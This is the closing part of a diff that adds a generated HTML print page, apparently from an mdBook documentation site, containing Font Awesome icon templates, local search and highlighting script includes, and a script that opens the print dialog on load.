+        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
+        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
+        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
+        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr-ef4e11c1.min.js"></script>
+        <script src="mark-09e88c2c.min.js"></script>
+        <script src="searcher-09f2665d.js"></script>
+
+        <script src="clipboard-1626706a.min.js"></script>
+        <script src="highlight-abc7f01d.js"></script>
+        <script src="book-609e4cb8.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="src/theme/diagram-lightbox-9e7247a3.js"></script>
+
+        <script>
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+
+    </div>
+    </body>
+</html>
